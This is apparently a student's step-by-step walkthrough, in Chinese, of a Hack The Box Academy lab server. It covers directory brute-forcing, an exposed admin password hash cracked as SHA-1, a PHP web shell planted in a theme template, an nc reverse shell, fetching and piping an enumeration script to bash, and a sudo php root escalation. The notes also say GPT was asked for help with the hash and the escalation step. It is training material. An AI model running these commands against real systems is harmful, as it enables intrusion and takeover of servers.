## https://academy.hackthebox.com/module/77/section/853

1. 去路徑http://10.129.242.230/

2. 使用gobuster掃描
gobuster dir -u http://10.129.242.230/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

3. 登入畫面
http://10.129.242.230/admin/

4. curl -l http://10.129.242.230/robots.txt
=> disaallow: /admin/

5. http://10.129.242.230/plugins/

6. http://10.129.242.230/theme/
=> http://10.129.242.230/theme/Cardinal/images/

7. http://10.129.242.230/theme/Cardinal/template.php
=> you cannot load this page directly

8. curl -k http://10.129.242.230/theme/Cardinal/template.php

9. gobuster dir -u http://10.129.242.230/theme/Cardinal -w /usr/share/seclists/Discovery/Web-Content/common.txt

10. curl -k http://10.129.242.230/sitemap.xml | xmllint --format -

11. http://10.129.242.230/data/

12. http://10.129.242.230/data/users/admin.xml
pwd: d033e22ae348aeb5660fc2140aec35850c4da997
email: admin@gettingstarted.com

13. http://10.129.242.230/data/

14. http://10.129.242.230/data/users/admin.xml.reset
user: admin
pwd: d033e22ae348aeb5660fc2140aec35850c4da997
email: admin@gettingstarted.com

15. http://10.129.242.230/data/other/logs/failedlogins.log
確定userName: admin

16. 問了gpt 這個是什麼的加密，gpt 說是 SHA-1 Hash 的加密
 decode: echo -n "admin" | sha1sum
=> password 為 admin

17. 登入 http://10.129.242.230/admin/
admin/ admin

18. 進入 http://10.129.242.230/admin/pages.php

19. gobuster dir -u http://10.129.242.230/admin/upload.php -w /usr/share/seclists/Discovery/Web-Content/common.txt

20. http://10.129.242.230/theme/Innovation/images/
這邊可以看到上傳的影片

21. http://10.129.242.230/theme/Innovation/template.php

22. 透過修改http://10.129.242.230/theme/Innovation/template.php 的內容為 
<?php system('id'); ?>
我現在可以拿到
uid=33(www-data) gid=33(www-data) groups=33(www-data) 了

23. 接下來將腳本修改為：
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.20 9443 >/tmp/f"); ?>

24. 在本機中使用：nc -lvnp 9443

24.5 wget http://10.129.242.230/theme/Innovation/template.php

25. python -c 'import pty; pty.spawn("/bin/bash")'
python not found

26. python3 -c 'import pty; pty.spawn("/bin/bash")'
=> success

27. https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

28. curl -O https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
=> 失敗，抓不到擋案 can/t connect raw.github

29. 本機執行：sudo python3 -m http.server 8080

30. curl -O https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

30.5 curl -O http://10.10.14.20:8080/LinEnum.sh

31. curl http://10.10.14.20:8080/LinEnum.sh | bash

32.  echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a aaa.sh

33. 再問gpt 後他說：
sudo /usr/bin/php -r 'system("/bin/bash");'
這樣就可以提身權限為root
然後就是root 了，就拿到flag 了！！